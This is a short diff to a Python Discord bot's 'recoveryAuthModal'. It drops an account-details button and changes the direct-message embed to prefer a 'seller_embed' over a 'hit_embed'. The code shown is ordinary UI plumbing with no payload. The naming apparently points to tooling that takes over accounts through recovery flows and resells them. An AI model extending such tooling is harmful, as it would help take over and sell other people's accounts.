@@ -2,7 +2,6 @@ from discord import ui
 import discord
 
 from securing.recovery_secure import recovery_secure
-from ui.buttons.account_details import accountInfo
 
 class recoveryAuthModal(ui.Modal):
     def __init__(self):
@@ -59,9 +58,6 @@ class recoveryAuthModal(ui.Modal):
             return
         
         await interaction.user.send(
-            embed = account["hit_embed"],
-            view = accountInfo(
-                account["details"]
-            )
+            embed=account.get("seller_embed") or account["hit_embed"],
         )
     
